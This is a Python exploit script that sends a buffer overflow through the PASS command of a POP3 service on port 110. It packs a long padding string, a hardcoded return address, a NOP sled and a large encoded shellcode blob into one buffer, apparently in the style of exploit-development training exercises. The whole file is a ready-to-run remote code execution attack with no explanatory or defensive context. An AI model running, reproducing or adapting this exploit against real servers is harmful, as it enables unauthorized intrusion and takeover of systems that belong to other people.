#!/usr/bin/python

import socket
import sys

def get_shellcode():
	buf = ""
	buf += "\xd9\xcc\xbb\xc7\xd6\x24\xeb\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
	buf += "\x52\x83\xea\xfc\x31\x5a\x13\x03\x9d\xc5\xc6\x1e\xdd\x02\x84"
	buf += "\xe1\x1d\xd3\xe9\x68\xf8\xe2\x29\x0e\x89\x55\x9a\x44\xdf\x59"
	buf += "\x51\x08\xcb\xea\x17\x85\xfc\x5b\x9d\xf3\x33\x5b\x8e\xc0\x52"
	buf += "\xdf\xcd\x14\xb4\xde\x1d\x69\xb5\x27\x43\x80\xe7\xf0\x0f\x37"
	buf += "\x17\x74\x45\x84\x9c\xc6\x4b\x8c\x41\x9e\x6a\xbd\xd4\x94\x34"
	buf += "\x1d\xd7\x79\x4d\x14\xcf\x9e\x68\xee\x64\x54\x06\xf1\xac\xa4"
	buf += "\xe7\x5e\x91\x08\x1a\x9e\xd6\xaf\xc5\xd5\x2e\xcc\x78\xee\xf5"
	buf += "\xae\xa6\x7b\xed\x09\x2c\xdb\xc9\xa8\xe1\xba\x9a\xa7\x4e\xc8"
	buf += "\xc4\xab\x51\x1d\x7f\xd7\xda\xa0\xaf\x51\x98\x86\x6b\x39\x7a"
	buf += "\xa6\x2a\xe7\x2d\xd7\x2c\x48\x91\x7d\x27\x65\xc6\x0f\x6a\xe2"
	buf += "\x2b\x22\x94\xf2\x23\x35\xe7\xc0\xec\xed\x6f\x69\x64\x28\x68"
	buf += "\x8e\x5f\x8c\xe6\x71\x60\xed\x2f\xb6\x34\xbd\x47\x1f\x35\x56"
	buf += "\x97\xa0\xe0\xf9\xc7\x0e\x5b\xba\xb7\xee\x0b\x52\xdd\xe0\x74"
	buf += "\x42\xde\x2a\x1d\xe9\x25\xbd\x28\xee\x27\x32\x45\xec\x27\x4d"
	buf += "\x2e\x79\xc1\x27\x40\x2c\x5a\xd0\xf9\x75\x10\x41\x05\xa0\x5d"
	buf += "\x41\x8d\x47\xa2\x0c\x66\x2d\xb0\xf9\x86\x78\xea\xac\x99\x56"
	buf += "\x82\x33\x0b\x3d\x52\x3d\x30\xea\x05\x6a\x86\xe3\xc3\x86\xb1"
	buf += "\x5d\xf1\x5a\x27\xa5\xb1\x80\x94\x28\x38\x44\xa0\x0e\x2a\x90"
	buf += "\x29\x0b\x1e\x4c\x7c\xc5\xc8\x2a\xd6\xa7\xa2\xe4\x85\x61\x22"
	buf += "\x70\xe6\xb1\x34\x7d\x23\x44\xd8\xcc\x9a\x11\xe7\xe1\x4a\x96"
	buf += "\x90\x1f\xeb\x59\x4b\xa4\x1b\x10\xd1\x8d\xb3\xfd\x80\x8f\xd9"
	buf += "\xfd\x7f\xd3\xe7\x7d\x75\xac\x13\x9d\xfc\xa9\x58\x19\xed\xc3"
	buf += "\xf1\xcc\x11\x77\xf1\xc4"

	return buf

def get_buffer():
	return "A" * 2606 +	"\x8f\x35\x4a\x5f" + "\x90" * 8


def send_buffer():
	host = sys.argv[1]
	buffer = get_buffer() + get_shellcode()
	
	sck = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	print("Send evil buffer...")
	sck.connect((host, 110))
	sck.recv(1024)
	sck.send("USER username\r\n")
	sck.recv(1024)
	sck.send("PASS " + buffer + "\r\n")
	sck.recv(1024)
	print("Done!")


try:
	send_buffer()
except Exception as e:
	print("ERROR: " + str(e))